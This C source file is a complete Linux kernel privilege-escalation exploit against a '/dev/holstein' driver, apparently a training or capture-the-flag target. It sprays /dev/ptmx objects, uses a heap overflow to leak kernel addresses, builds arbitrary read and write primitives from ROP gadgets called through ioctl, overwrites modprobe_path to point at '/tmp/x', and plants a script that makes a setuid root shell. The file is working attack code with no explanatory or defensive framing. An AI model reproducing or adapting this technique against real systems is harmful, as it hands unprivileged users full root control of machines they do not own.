#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupt*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;
typedef uint32_t u32;

u64 dev_fd;
u64 spray[100];
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
u64 mov_ptr_rdx_rcx_ret, mov_eax_ptr_rdx_ret, modprobe_path;
char buf[0x500]; // declaration in global to prevent bad coding pratice (etc, forget to rewrite struct metadata value when heap overflow)

void win()
{
    system("echo '#!/bin/sh\nmv /evilsu /tmp/evilsu\nchmod u+s /tmp/evilsu\nchmod 777 /evilsu' > /tmp/x");
    system("chmod 777 /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod 777 /tmp/dummy");
    system("/tmp/dummy");
    puts("[*] win, run '/tmp/evilsu' to get root");
}


void heap_spray()
{
    for_x(i, 0, 49) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    dev_fd = open("/dev/holstein", O_RDWR);
    for_x(i, 50, 100) spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
}

void leak()
{
    read(dev_fd, buf, 0x500);
    kbase = *(u64 *)(&buf[0x418]) - 0xc38880;
    g_buf = *(u64 *)(&buf[0x438]) - 0x438;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[?] koffset: 0x%lx\n", koffset);

    mov_ptr_rdx_rcx_ret = koffset + 0xffffffff810477f7; // 0xffffffff810477f7 : mov qword ptr [rdx], rcx ; ret
    mov_eax_ptr_rdx_ret = koffset + 0xffffffff8118a285; // 0xffffffff8118a285 : mov eax, dword ptr [rdx] ; ret
    modprobe_path = koffset + 0xffffffff81e38180;
}

void aaw32(u64 addr, u32 val)
{
    u64 *p = (u64 *)(&buf);
    p[0xc] = mov_ptr_rdx_rcx_ret;
    *(u64 *)(&buf[0x418]) = g_buf;
    write(dev_fd, buf, 0x420);
    for_x(i, 0, 100) ioctl(spray[i], val /* rcx */, addr /* rdx */);
}

u32 aar32(u64 addr)
{
    u32 retval;
    u64 *p = (u64 *)(&buf);
    p[0xc] = mov_eax_ptr_rdx_ret;
    *(u64 *)(&buf[0x418]) = g_buf;
    write(dev_fd, buf, 0x420);
    for_x(i, 0, 100) 
    {
        retval = ioctl(spray[i], 0, addr /* rdx */);
        if(retval != -1) return retval; 
    }
}

void ovw_modprobe()
{
    puts("[*] overwrite modprobe");
    aaw32(modprobe_path, 0x706d742f);
    aaw32(modprobe_path + 4, 0x782f);
    // modprobe_path -> "/tmp/x"
}

int main()
{
    heap_spray();
    leak();
    ovw_modprobe();
    win();
}